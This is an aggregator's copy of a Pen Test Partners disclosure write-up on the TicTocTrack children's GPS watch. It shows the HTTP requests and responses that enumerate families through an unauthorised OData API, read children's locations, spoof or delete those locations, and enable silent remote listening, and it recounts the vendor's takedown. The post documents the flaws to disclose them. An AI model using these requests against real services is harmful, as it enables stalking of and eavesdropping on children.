<!DOCTYPE html>
<html lang="en">
<head>
    <title>
Tic Toc Pwned | Pen Test Partners -
linksfor.dev(s)
    </title>
    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
    <meta charset="utf-8">
    <meta name="Description" content="A curated source of links that devs might find interesting. Updated around the clock." />
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="grid">
        
<div class="readable">
    <div id="readOverlay" class="style-ebook"><div id="readInner" class="margin-medium size-medium"><h1>Tic Toc Pwned | Pen Test Partners</h1><div><div class="editor"><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2019/04/ticwatchers-banner2.png" class="alignnone wp-image-15176" alt="alt" width="800" height="400" srcset="https://www.pentestpartners.com/content/uploads/2019/04/ticwatchers-banner2.png 1000w, https://www.pentestpartners.com/content/uploads/2019/04/ticwatchers-banner2-300x150.png 300w, https://www.pentestpartners.com/content/uploads/2019/04/ticwatchers-banner2-768x384.png 768w" sizes="(max-width: 800px) 100vw, 800px"></p><p>We were recently tipped off that the Australian Tic Toc Track watch was almost undoubtedly just a version of the Gator kids GPS tracking watch. That’s the tracker watch which leaked real time kids position data to anyone, it also allowed anyone to silently listen to children through the watch.</p><p>Creepy!</p><p>It all started with the Norwegian Consumer Council <a href="https://www.forbrukerradet.no/side/significant-security-flaws-in-smartwatches-for-children/" target="_blank" rel="noopener noreferrer">exposing concerning flaws</a>. Here’s our friend Finn Myrstad from the NCC explaining the problems:</p><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch1.png" class="alignnone size-full wp-image-15136" alt="alt" width="663" height="454" srcset="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch1.png 663w, https://www.pentestpartners.com/content/uploads/2019/04/OzWatch1-300x205.png 300w" sizes="(max-width: 663px) 100vw, 663px"></p><p>And ended up with us <a href="https://www.pentestpartners.com/security-blog/tracking-and-snooping-on-a-million-kids/" target="_blank" rel="noopener noreferrer">totally compromising the platform</a>.</p><p>This was what got our attention: a press article last week. Those watch boxes look VERY familiar:</p><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch2.png" class="alignnone size-full wp-image-15137" alt="alt" width="725" height="739" srcset="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch2.png 725w, https://www.pentestpartners.com/content/uploads/2019/04/OzWatch2-294x300.png 294w, https://www.pentestpartners.com/content/uploads/2019/04/OzWatch2-45x45.png 45w" sizes="(max-width: 725px) 100vw, 725px"></p><p>Yep, they’re Gator watches.</p><p>The claim in the article is also rather misleading: ‘A Brisbane mum who developed a GPS tracking watch…’ is not strictly true – TicTocTrack developed a new backend.</p><p>The watches were imported from the Caref Watch Co, based in Shenzen China!</p><p>Easily found on Alibaba: <a href="https://www.alibaba.com/showroom/gator-caref-watch.html" target="_blank" rel="noopener noreferrer">https://www.alibaba.com/showroom/gator-caref-watch.html</a></p><h3>So what?</h3><p>Caref / Gator fixed a significant API platform flaw that we found a while back. It allowed complete platform compromise, but it didn’t affect the Tic Toc Track watch. Why?</p><p>Well, their model was to keep all kids data onshore in Australia. They hosted a version of the API themselves, hosted by Aussie hosting firm 6YS. Tic Toc Track also wrote their own mobile app, written by a Sri Lanka based firm called Nibaya.</p><p>Interesting idea, except that it doesn’t appear that anyone checked it’s security.</p><p>But we needed a watch…</p><h3>Anyone know any Aussie security researchers?</h3><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch3.png" class="alignnone size-full wp-image-15138" alt="alt" width="418" height="308" srcset="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch3.png 418w, https://www.pentestpartners.com/content/uploads/2019/04/OzWatch3-300x221.png 300w" sizes="(max-width: 418px) 100vw, 418px"></p><p>@troyhunt to the rescue!!</p><p>Here’s the watch he bought for us:</p><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch4.png" class="alignnone size-full wp-image-15139" alt="alt" width="620" height="460" srcset="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch4.png 620w, https://www.pentestpartners.com/content/uploads/2019/04/OzWatch4-300x223.png 300w" sizes="(max-width: 620px) 100vw, 620px"></p><p>So we got stuck in</p><p>The backend is an <a href="https://www.odata.org/" target="_blank" rel="noopener noreferrer">odata</a> REST interface with a basic authentication of username:password that are provided during login. Backend does not make any authorization attempt on any request other than the user having a valid username/password combination. There are multiple ways an attacker can compromise the application. The easiest way is to intercept the call to the initial call to</p><p><strong>Request:</strong></p><pre>GET /api//Users?$<span>filter=(mailto:ID%20eq%20%<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e3d1d4bbbbbbbbbbbbbbbbbba3848e828a8fcd808c8e">[email&nbsp;protected]</a>%27)&amp;$select=ID,CompositeID,FirstName,LastName,Email,FamilyIdentifier,ProfilePictureUrl</span> HTTP/1.1
Host: tracker.tictoctrack.com
Connection: close
Accept: application/atomsvc+xml;q=0.8, application/json;odata=fullmetadata;q=0.7, application/json;q=0.5, */*;q=0.1
MaxDataServiceVersion: 3.0
DataServiceVersion: 3.0</pre><p><strong>Response:</strong></p><pre>HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; odata=fullmetadata; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
DataServiceVersion: 3.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Access-Control-Expose-Headers: MaxDataServiceVersion, DataServiceVersion
Date: Fri, 12 Apr 2019 06:46:53 GMT
Connection: close
Content-Length: 586

{
"odata.metadata":"https://tracker.tictoctrack.com/api/$metadata#Users&amp;$select=ID,CompositeID,FirstName,LastName,Email,FamilyIdentifier,ProfilePictureUrl","value":[
{
"odata.type":"Nibaya.CsApi.GPS.DataLayer.BusinessLogic.Dto.UserDto","odata.id":"https://tracker.tictoctrack.com/api/Users('<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b5edededededededededf5d2d8d4dcd99bd6dad8">[email&nbsp;protected]</a>')","ID":"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6f3737373737373737372f08020e0603410c0002">[email&nbsp;protected]</a>","CompositeID":"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="91c9c9c9c9c9c9c9c9c9d1f6fcf0f8fdbff2fefc">[email&nbsp;protected]</a>","FirstName":"XXXXXXXXX","LastName":"XXXXXXXXX","Email":"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0d5555555555555555554d6a606c6461236e6260">[email&nbsp;protected]</a>",<span>"FamilyIdentifier":34XX</span>,"ProfilePictureUrl":"https://tracker.tictoctrack.com/res/img/usermeta/DEFAULT_IMG.jpg"
}
]
}</pre><p>FamilyIdentifier is an incrementing integer identifying the family that the user belongs to and just changing it to another number gives COMPLETE ACCESS to that familys data including childrens location, parents full names, parents phone numbers and other PII.</p><p>But we don’t need to use the app to interact with the api ,we can use the odata endpoints found in here:</p><p><a href="https://tracker.tictoctrack.com/api">https://tracker.tictoctrack.com/api</a></p><p>…and use the metadata found on:</p><p><a href="https://tracker.tictoctrack.com/api/$metadata">https://tracker.tictoctrack.com/api/$metadata</a></p><p>After that we can access any user by directly querying database by Incrementing FamilyIdentifier.</p><pre>GET /api//Users?<span>$filter=(FamilyIdentifier%20eq%2034XX)</span> HTTP/1.1
Host: tracker.tictoctrack.com
Connection: close
Accept: application/atomsvc+xml;q=0.8, application/json;odata=fullmetadata;q=0.7, application/json;q=0.5, */*;q=0.1
MaxDataServiceVersion: 3.0
DataServiceVersion: 3.0</pre><p>You could also just remove the $filter and get ALL users (but that would be highly illegal so was not verified).</p><p>You can also get a child’s last location with the following request</p><p><strong>Request:</strong></p><pre>POST /api//NewestLocations/GetMultipleRecentLocation HTTP/1.1
Host: tracker.tictoctrack.com
Connection: close
Content-Length: 46
MaxDataServiceVersion: 3.0
Origin: https://tracker.tictoctrack.com
Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXX
Content-Type: application/json;odata=verbose
Accept: application/atomsvc+xml;q=0.8, application/json;odata=fullmetadata;q=0.7, application/json;q=0.5, */*;q=0.1

{"FamilyID":34XX,"DeviceIDS":['xxxxx']}</pre><p>And this is where everything takes a really dark turn as you can also manipulate the last location, having the child position</p><p><strong>Request:</strong></p><pre>POST /api//NewestLocations/ HTTP/1.1
Host: tracker.tictoctrack.com
Connection: close
Content-Length: 1558
MaxDataServiceVersion: 3.0
Origin: https://tracker.tictoctrack.com
Content-Type: application/json;odata=verbose
Accept: application/atomsvc+xml;q=0.8, application/json;odata=fullmetadata;q=0.7, application/json;q=0.5, */*;q=0.1
DataServiceVersion: 3.0
Referer: https://tracker.tictoctrack.com/track
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{
"odata.type": "Nibaya.CsApi.GPS.DataLayer.BusinessLogic.Dto.NewestLocationDto",
"odata.id": "https://tracker.tictoctrack.com/api/NewestLocations('34XX%7Cxxxxxxx')",
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c781a6aaaeabbe87a8a3a6b3a6e9a9a6b1aea0a6b3aea8a98baea9ac92b5ab">[email&nbsp;protected]</a>": "https://tracker.tictoctrack.com/api/NewestLocations('34X%7Cxxxxxx')/Family",
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2761464a4e4b5e6342514e4442674843465346094946514e40">[email&nbsp;protected]</a>ationLinkUrl": "https://tracker.tictoctrack.com/api/NewestLocations('34XX%7Cxxxxxx')/FamilyDevice",
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="306255535f42545554705f545144511e44494055">[email&nbsp;protected]</a>": "Edm.DateTime",
"Recorded": "2019-04-10T06:38:00",
"DeviceTerminalID": "xxxxxxx",
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c084a5b6a9a3a594a9ada580afa4a1b4a1eeb4b9b0a5">[email&nbsp;protected]</a>": "Edm.DateTime",
"DeviceTime": "2019-04-10T16:38:00",
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0b476a7f627f7e6f6e4b646f6a7f6a257f727b6e">[email&nbsp;protected]</a>": "Edm.Decimal",
<span>"Latitude": "-27.XXXXXXX",</span>
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a5e9cacbc2ccd1d0c1c0e5cac1c4d1c48bd1dcd5c0">[email&nbsp;protected]</a>": "Edm.Decimal",
<span>"Longitude": "153.XXXXXXX",</span>
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d784a7b2b2b397b8b3b6a3b6f9a3aea7b2">[email&nbsp;protected]</a>": "Edm.Decimal",
"Speed": "0.000",
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a2e6cbd0c7c1d6cbcdcce2cdc6c3d6c38cd6dbd2c7">[email&nbsp;protected]</a>": "Edm.Decimal",
"Direction": "0.00",
"OnOff": false,
"Located": false,
"SOS": false,
"OriginalMessage": "(xxxxxxxx)",
"LocationType": "WiFi",
"TimezoneId": null,
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d694b7a2a2b3a4af9ab3a0b3ba96b9b2b7a2b7f8a2afa6b3">[email&nbsp;protected]</a>": "Edm.Decimal",
"BatteryLevel": "100.0",
"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1955767a786d7c7d567759767d786d78376d60697c">[email&nbsp;protected]</a>": "Edm.DateTime",
"LocatedOn": "2019-04-10T06:38:00",
"LocationAddress": "XX XXXXXX XXX, XXXXX XXXXXX XXX XXXX, Australia",
"ID": "xxxxx",
"CompositeID": {
"odata.type": "Nibaya.CsApi.GPS.Data.Basic.Domain.NewestLocationIdentifier",
"FamilyID": 34XX,
"DeviceID": "xxxxxxxx"
}
}<strong>&nbsp;</strong></pre><p>And by using</p><p><a href="https://tracker.tictoctrack.com/api/$batch">https://tracker.tictoctrack.com/api/$batch</a></p><p>you can DELETE the real location of the watch leaving back no trace at all. And this is not the worst part yet. The watch automatically answers any call from a phone number marked as an emergency number. Something that can be done on</p><p><a href="https://tracker.tictoctrack.com/api/$batch">https://tracker.tictoctrack.com/api/$batch</a></p><p>…and then you can call the watch’s number and snoop on it.</p><p>So by using either the app or directly accessing API you can access , manipulate and delete anyones data and snoop and 2 way communicate with any watch.</p><p>The $batch endpoint accepts batch requests as we can see documented in here: <a href="https://www.odata.org/documentation/odata-version-3-0/batch-processing/" target="_blank" rel="noopener noreferrer">https://www.odata.org/documentation/odata-version-3-0/batch-processing/</a></p><p>All in all we can see that the developer of the backend took no consideration into authorizing any of the requests, and cared only that the application was working effectively leaving all the data available to access and manipulate. This is unacceptable for a product that is supposed to keep children secure and a trend that we constantly see in the IoT market that products are rushed to the market.</p><p>We successfully rewrote the GPS position data and moved Troy’s daughters reported position to the other side of Brisbane. Panic!</p><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch5.png" class="alignnone size-full wp-image-15140" alt="alt" width="333" height="575" srcset="https://www.pentestpartners.com/content/uploads/2019/04/OzWatch5.png 333w, https://www.pentestpartners.com/content/uploads/2019/04/OzWatch5-174x300.png 174w" sizes="(max-width: 333px) 100vw, 333px"></p><p>There’s a remote listen function too: the parent can call the watch, though there’s a restriction so that only the parents phone can call the watch. That’s trivial to replace using the API flaws, so now we can listen remotely to the child from anywhere in the world</p><h3>Disclosure. Not a train wreck, for once!</h3><p>We dropped Tic Toc Track a line asking how to report security flaws. Their customer support team replied a few hours later indicating that reports could be sent direct to them. Good start</p><p>On Friday we sent a more detailed explanation, pointing out that requests weren’t authorised, referencing the work of the Norwegian Consumer Council, our previous work and recommended that the service was taken down.</p><p>It appears that the customer service email account wasn’t monitored over the weekend, but on return to work TicTocTrack promptly took the service down and INFORMED ALL OF THEIR CUSTOMERS. Wow!</p><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2017/04/OzWatch6.png" class="alignnone size-full wp-image-15170" alt="alt" width="749" height="775" srcset="https://www.pentestpartners.com/content/uploads/2017/04/OzWatch6.png 749w, https://www.pentestpartners.com/content/uploads/2017/04/OzWatch6-290x300.png 290w" sizes="(max-width: 749px) 100vw, 749px"></p><p>Whilst the service shouldn’t have been vulnerable in the first place, TicTocTrack pulled a blinder by acting so quickly. A great example of managing disclosure well!</p><p>My only beef with the above statement was this:</p><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2018/07/QuoteOpen.png" class="alignnone size-full wp-image-12486" alt="alt" width="31" height="25"></p><p>To this day, there has never been a security breach that has lead to our customer’s personal&nbsp; data being used for malicious purposes. Our team are constantly working to improve our&nbsp; software and make it as safe as possible for our users.</p><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2018/07/QuoteClose.png" class="alignnone size-full wp-image-12487" alt="alt" width="30" height="24"></p><p>Er – with missing authorisation, they have NO IDEA if the data has been used or not. All that they can be certain of is that no-one other than us has reported that data has been exposed.</p><p>One interesting point I noticed was this announcement: <a href="https://itbrief.com.au/story/queensland-govt-backs-safety-tech-firm-to-tune-of-1m" target="_blank" rel="noopener noreferrer">https://itbrief.com.au/story/queensland-govt-backs-safety-tech-firm-to-tune-of-1m</a></p><p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2017/04/OzWatch7.png" class="alignnone size-full wp-image-15171" alt="alt" width="801" height="819" srcset="https://www.pentestpartners.com/content/uploads/2017/04/OzWatch7.png 801w, https://www.pentestpartners.com/content/uploads/2017/04/OzWatch7-293x300.png 293w, https://www.pentestpartners.com/content/uploads/2017/04/OzWatch7-768x785.png 768w, https://www.pentestpartners.com/content/uploads/2017/04/OzWatch7-45x45.png 45w" sizes="(max-width: 801px) 100vw, 801px"></p><p>So the Queensland Govt invested in a firm that leaked children’s data? I think I would want to have done more due diligence before making that investment!</p><p>But, the service is down now and TicTocTrack assured customers that the issues will be fixed before they take it live again.</p><h3>Conclusion</h3><p>Somehow, Tic Toc Track made the terrible Gator watch API security WORSE when they implemented it in Australia. That’s some going!</p><p>Far from protecting the data of Australian children, it was even more exposed than if they had used the Gator API hosted in China.</p><p>Anyone could discover the location of children using the watch. Anyone could tamper with that position data, making you think your children were safe whilst they were actually elsewhere.</p><p>Anyone could cause false alarms by moving the reported position of your child.</p><p>Anyone could silently listen to your child, or talk to your child through their smartwatch. They could listen to you silently too, if you were near the watch.</p><p>BUT, they responded fast and took appropriate action. TicTocTrack should be commended for that.</p><p>Working with Troy Hunt was really great, I love how the security research community around the world can pull together so effectively. Here’s Troy’s blog: <a href="https://www.troyhunt.com/how-to-track-your-kids-and-other-peoples-kids-with-the-tictoctrack-watch/" target="_blank" rel="noopener noreferrer">https://www.troyhunt.com/how-to-track-your-kids-and-other-peoples-kids-with-the-tictoctrack-watch/</a>.</p></div></div></div></div>
</div>
    </div>
    <footer>
        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
    </footer>
    
    <script>
        (function () {
            var COLLECT_URL = "https://dna.buildstarted.com/t";
            var SITE_ID = "linksfor.devs";
            var GLOBAL_VAR_NAME = "__DNA__";

            window[GLOBAL_VAR_NAME] = {};

            window[GLOBAL_VAR_NAME].sendPageView = function () {
                var path = location.pathname;
                var referrer = document.referrer;

                var url = COLLECT_URL + "?siteid=" + SITE_ID + "&p=" + encodeURIComponent(path) + "&r=" + encodeURIComponent(referrer);

                try { fetch(url, { method: "GET" }); } catch (e) { }
            };

            window[GLOBAL_VAR_NAME].sendPageView();
        })();
    </script>
</body>
</html>